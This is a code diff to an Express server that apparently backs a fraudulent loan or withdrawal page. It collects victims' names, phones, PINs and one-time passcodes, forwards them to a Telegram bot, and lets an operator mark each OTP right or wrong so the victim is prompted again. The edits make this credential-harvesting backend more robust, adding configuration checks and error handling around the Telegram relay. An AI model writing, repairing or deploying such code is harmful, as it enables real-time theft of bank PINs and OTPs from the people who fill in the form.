@@ -5,13 +5,19 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+// Use Environment Variables provided by Render (matching BOT_TOKEN and CHAT_ID)
+const BOT_TOKEN = process.env.BOT_TOKEN; 
+const CHAT_ID = process.env.CHAT_ID; 
 
 let latestStatus = "pending"; // Tracks approval status
 
 // 1. Receive loan application / withdrawal from frontend
 app.post('/api/submit', async (req, res) => {
+    if (!BOT_TOKEN || !CHAT_ID) {
+        console.error("Missing Telegram Bot Token or Chat ID in environment variables.");
+        return res.json({ success: false, error: "Server configuration error" });
+    }
+
     const { name, phone, amount, purpose, pin } = req.body;
     latestStatus = "pending";
 
@@ -57,6 +63,8 @@ app.get('/api/status', (req, res) => {
 
 // 3. Receive OTP from frontend and send to Telegram
 app.post('/api/submit-otp', async (req, res) => {
+    if (!BOT_TOKEN || !CHAT_ID) return res.json({ success: false });
+
     const { phone, otp } = req.body;
     latestStatus = "pending";
 
@@ -93,27 +101,26 @@ app.post('/api/submit-otp', async (req, res) => {
     }
 });
 
-// 4. Telegram Webhook to catch button clicks instantly
+// 4. Telegram Webhook to catch button clicks instantly and safely
 app.post('/webhook', async (req, res) => {
-    // Respond to Telegram instantly so the button doesn't hang
+    // Immediately tell Telegram we received the update so it never hangs or retries
     res.sendStatus(200);
 
-    const update = req.body;
-    
-    if (update && update.callback_query) {
-        const action = update.callback_query.data;
-        const callbackQueryId = update.callback_query.id;
+    try {
+        const update = req.body;
         
-        console.log(`🔔 Webhook received action: ${action}`);
+        if (update && update.callback_query) {
+            const action = update.callback_query.data;
+            const callbackQueryId = update.callback_query.id;
+            
+            console.log(`🔔 Webhook received action: ${action}`);
 
-        if (action.startsWith("approve") || action.startsWith("correct_otp")) {
-            latestStatus = "approved";
-        } else if (action.startsWith("decline") || action.startsWith("wrong_otp")) {
-            latestStatus = "wrong_otp";
-        }
-        
-        // Acknowledge the callback query to clear button loading state
-        try {
+            if (action.startsWith("approve") || action.startsWith("correct_otp")) {
+                latestStatus = "approved";
+            } else if (action.startsWith("decline") || action.startsWith("wrong_otp")) {
+                latestStatus = "wrong_otp";
+            }
+            
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -122,9 +129,9 @@ app.post('/webhook', async (req, res) => {
                     text: "Action recorded successfully!" 
                 })
             });
-        } catch (err) {
-            console.error("Callback answer error:", err.message);
         }
+    } catch (err) {
+        console.error("Webhook processing error:", err.message);
     }
 });
 
